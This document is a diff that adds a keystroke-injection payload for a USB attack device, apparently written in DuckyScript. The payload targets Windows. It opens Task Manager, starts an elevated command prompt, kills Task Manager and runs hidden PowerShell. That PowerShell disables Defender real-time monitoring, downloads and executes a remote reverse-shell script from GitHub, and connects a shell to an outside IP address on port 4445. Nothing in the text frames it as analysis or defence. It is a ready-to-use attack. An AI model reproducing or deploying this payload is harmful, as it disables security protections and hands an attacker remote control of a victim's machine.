@@ -1,0 +1,14 @@
+DELAY 300
+GUI r
+DELAY 20
+STRING taskmgr
+DELAY 150
+ALT f
+n
+DELAY 50
+STRING cmd
+TAB
+SPACE
+ENTER
+DELAY 20
+STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 37.114.40.198 4445");
